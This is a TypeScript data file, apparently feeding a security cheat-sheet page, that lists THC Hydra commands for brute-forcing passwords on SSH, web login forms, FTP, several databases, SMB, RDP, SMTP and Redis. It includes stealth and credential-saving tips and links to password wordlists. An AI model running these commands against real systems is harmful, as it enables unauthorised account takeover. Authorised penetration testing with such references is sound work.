export interface HydraCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const hydraCategories: HydraCategory[] = [
  {
    category: "Installation & Setup",
    commands: [
      { command: "apt install hydra", description: "Install on Kali/Debian" },
      { command: "brew install hydra", description: "Install on macOS" },
      { command: "hydra --help", description: "Verify installation" },
    ],
  },
  {
    category: "SSH Bruteforce",
    commands: [
      { command: "hydra -l admin -P passwords.txt ssh://target.com", description: "#1 Single username, password wordlist on SSH" },
      { command: "hydra -L users.txt -P passwords.txt ssh://target.com", description: "#2 Username and password wordlists on SSH" },
      { command: "hydra -l root -P passwords.txt -t 4 ssh://target.com", description: "#3 SSH with limited threads (stealth)" },
      { command: "hydra -l admin -P passwords.txt -f ssh://target.com", description: "#4 Stop after first valid credential found" },
    ],
  },
  {
    category: "Web Form Bruteforce",
    commands: [
      { command: "hydra -l user -P pass.txt target.com http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"", description: "#1 POST form with failure string detection" },
      { command: "hydra -L users.txt -P pass.txt target.com http-post-form \"/login:username=^USER^&password=^PASS^:S=success\"", description: "#2 Custom field names with success string" },
      { command: "hydra -l admin -P pass.txt -t 10 target.com https-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"", description: "#3 HTTPS POST form bruteforce" },
      { command: "hydra -l user -P pass.txt target.com http-get-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"", description: "#4 GET form bruteforce" },
    ],
  },
  {
    category: "FTP & Database Bruteforce",
    commands: [
      { command: "hydra -L users.txt -P passwords.txt ftp://target.com", description: "#1 FTP bruteforce with user/pass lists" },
      { command: "hydra -l root -P passwords.txt mysql://target.com", description: "#2 MySQL database bruteforce" },
      { command: "hydra -l admin -P passwords.txt postgres://target.com", description: "#3 PostgreSQL bruteforce" },
      { command: "hydra -l sa -P passwords.txt mssql://target.com", description: "#4 MSSQL database bruteforce" },
    ],
  },
  {
    category: "Other Protocols",
    commands: [
      { command: "hydra -l admin -P passwords.txt smb://target.com", description: "#1 SMB/Windows share bruteforce" },
      { command: "hydra -L users.txt -P passwords.txt rdp://target.com", description: "#2 RDP (Remote Desktop) bruteforce" },
      { command: "hydra -l admin@target.com -P passwords.txt smtp://mail.target.com", description: "#3 SMTP email authentication bruteforce" },
      { command: "hydra -l admin -P passwords.txt redis://target.com", description: "#4 Redis database bruteforce" },
    ],
  },
  {
    category: "Tips & Best Practices",
    commands: [
      { command: "hydra -l admin -P passwords.txt -t 4 -f ssh://target.com", description: "Use -f to stop on first hit, saves time" },
      { command: "hydra -l admin -P passwords.txt -v ssh://target.com", description: "Use -v to see each attempt in real-time" },
      { command: "hydra -L users.txt -P passwords.txt -o results.txt ssh://target.com", description: "Always use -o to save valid credentials" },
      { command: "hydra -l admin -P passwords.txt -I ssh://target.com", description: "Use -I to ignore previous restore state" },
    ],
  },
]

export const hydraTools = [
  { name: "Hydra GitHub", url: "https://github.com/vanhauser-thc/thc-hydra", description: "Official repository with documentation" },
  { name: "SecLists - Passwords", url: "https://github.com/danielmiessler/SecLists/tree/master/Passwords", description: "Common password wordlists" },
  { name: "CeWL", url: "/methods/cewl", description: "Generate custom wordlists from target websites" },
]
